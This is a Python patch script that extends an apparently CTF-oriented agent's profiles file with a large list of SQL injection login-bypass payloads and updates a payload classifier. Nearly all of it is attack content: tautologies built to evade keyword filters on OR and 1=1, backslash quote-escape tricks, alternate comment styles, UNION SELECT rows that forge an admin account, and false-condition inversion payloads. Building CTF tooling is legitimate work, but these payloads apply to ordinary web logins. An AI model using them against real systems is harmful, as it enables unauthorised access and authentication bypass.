#!/usr/bin/env python3
"""v6 part 2: SQLi next-generation payloads + payload_class upgrade."""

from __future__ import annotations

from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
P = ROOT / "app" / "agent" / "ctf" / "profiles.py"


def patch(old: str, new: str) -> None:
    s = P.read_text(encoding="utf-8")
    assert old in s, f"anchor not found: {old[:60]!r}"
    s = s.replace(old, new, 1)
    P.write_text(s, encoding="utf-8")


# ------------------------------------------------- base family: new classes
patch(
    """    "admin'/*",
    "'=1' OR '1'='1",
]""",
    """    "admin'/*",
    "'=1' OR '1'='1",
    # v6: escape-the-quote — when the app escapes ' but forgets the
    # backslash, the closing quote of the PREVIOUS literal is consumed
    "\\\\",
    "1\\\\",
    "admin\\\\",
    # v6: true-equivalents that dodge keyword filters on OR/1=1
    "' OR TRUE#",
    "' OR 2>1 -- ",
    "' OR 'x'<'y -- ",
    "' OR LENGTH(1)=1 -- ",
    "' OR 1 IS NOT NULL -- ",
    "' OR CASE WHEN 1 THEN 1 END -- ",
    "' OR IF(1,1,0) -- ",
    "' OR (SELECT 1)=(SELECT 1) -- ",
    # v6: RDBMS comment styles beyond -- and #
    "' OR 1=1 %%27",
    "' OR 1=1 //",
    "' OR 1=1 /*",
    # v6: nested parentheses confuse naive quote-pair parsers
    "')))) OR 1=1 -- ",
    "(((' OR 1=1 -- ",
    # v6: function-based truth (string contexts)
    "' OR CONCAT('a','b')='ab' -- ",
    "' OR CURRENT_USER()=CURRENT_USER() -- ",
    "' OR USER()=USER() -- ",
    # v6: LIKE-wildcard tautology (password fields compared with LIKE)
    "' OR 'x' LIKE 'x' -- ",
    "' OR ''='' -- ",
]""",
)

# ------------------------------------------------- admin family additions
patch(
    """    "'/**/UNION/**/SELECT/**/'admin','x','admin'/**/--",
    "\\" UNION SELECT 'admin','x','admin' -- ",
]""",
    """    "'/**/UNION/**/SELECT/**/'admin','x','admin'/**/--",
    "\\" UNION SELECT 'admin','x','admin' -- ",
    # v6: role synonyms via arithmetic truth and CASE-shaping
    "' OR CASE role WHEN 'admin' THEN 1 ELSE 1 END -- ",
    "' OR is_admin<>0 -- ",
    "' OR is_admin!=0 -- ",
    "' OR admin IS NOT NULL -- ",
    "' OR privileges LIKE '%admin%' -- ",
    "' OR group_concat(role) LIKE '%admin%' -- ",
    "' UNION SELECT 'admin','x','x','x','x','admin' -- ",
    "' UNION SELECT NULL,'admin',NULL,NULL,'admin' -- ",
]""",
)

# ------------------------------------------------- inversion FALSE family
patch(
    """    ("' UNION SELECT 'admin','admin' -- ", "admin"),
    ("x' UNION SELECT 'admin' -- ", "admin"),
]""",
    """    ("' UNION SELECT 'admin','admin' -- ", "admin"),
    ("x' UNION SELECT 'admin' -- ", "admin"),
    # v6: false-equivalents beyond AND 1=2 — the deny-check must see
    # "no match" while the login flow still accepts the row
    ("' AND 1 IS NULL -- ", "x"),
    ("' AND 2<1 -- ", "x"),
    ("' AND 'x'>'y -- ", "x"),
    ("' AND LENGTH(1)=2 -- ", "x"),
    ("' AND CASE WHEN 0 THEN 1 END -- ", "x"),
    ("' AND IF(0,1,0) -- ", "x"),
    ("' AND (SELECT 1)<>(SELECT 1) -- ", "x"),
    ("admin' AND 1 IS NULL -- ", "admin"),
    ("admin' AND 2<1 -- ", "admin"),
]""",
)

# ------------------------------------------------- password family additions
patch(
    """    "' OR TRUE -- ",
    "' OR 1=1 LIMIT 1 -- ",
]""",
    """    "' OR TRUE -- ",
    "' OR 1=1 LIMIT 1 -- ",
    # v6: same next-gen tautologies on the password side
    "\\\\",
    "' OR 2>1 -- ",
    "' OR USER()=USER() -- ",
    "' OR ''='' -- ",
]""",
)

# ------------------------------------------------- payload_class new families
patch(
    '''    if re.search(r"(?i)\\bAND\\b", p) and re.search(r"(?i)1=2|'1'='2|FALSE", p):
        return "and_false"''',
    '''    if re.search(r"(?i)\\bAND\\b", p) and re.search(
        r"(?i)1=2|'1'='2|FALSE|2<1|IS NULL|<>\\(SELECT|'x'>'y|WHEN 0|IF\\(0", p
    ):
        return "and_false"
    if p.endswith("\\\\") or p in ("1\\\\", "admin\\\\"):
        return "escape_quote"
    if re.search(r"(?i)\\bCASE\\b|\\bIF\\(", p) and not re.search(r"(?i)\\bUNION\\b", p):
        return "conditional"''',
)

# like_wild family before or_true so %xxx% payloads classify right
patch(
    '''    if "%" in p:
        return "like_wild"''',
    '''    if "%" in p and not re.search(r"(?i)\\bOR\\b|\\bAND\\b|UNION|CONCAT", p):
        return "like_wild"''',
)

print("SQLi families upgraded")
